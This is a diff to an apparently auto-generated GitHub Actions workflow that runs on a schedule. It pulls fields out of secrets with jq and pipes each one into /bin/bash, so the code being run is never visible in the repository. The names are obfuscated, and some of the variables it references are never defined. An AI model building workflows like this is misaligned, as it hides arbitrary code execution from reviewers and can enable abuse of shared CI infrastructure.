@@ -2,7 +2,8 @@ name: xianghuaguo3451
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 1/6 * * *'
+    - cron: '40 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,11 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: xianghuaguo3451
         env:
-          a4: ${{ secrets.a4 }}
+          imfss06: ${{ secrets.imfss06 }}
         run: |
-          echo $a4 | jq -r .dxxvb764 | /bin/bash
-          echo $tf262 | jq -r .vifc19 | /bin/bash
-          echo $sac50 | jq -r .l6376 | /bin/bash
-          echo $xzo8 | jq -r .bkfd60711 | /bin/bash
-          echo $ga9336 | jq -r .qjqrj76 | /bin/bash
+          echo $imfss06 | jq -r .bvye7 | /bin/bash
+          echo $hrq36632 | jq -r .c0206 | /bin/bash
+          echo $n032 | jq -r .ern737 | /bin/bash
+          echo $gvov5408 | jq -r .tw8 | /bin/bash
+          echo $siwy04 | jq -r .wbf73 | /bin/bash
 
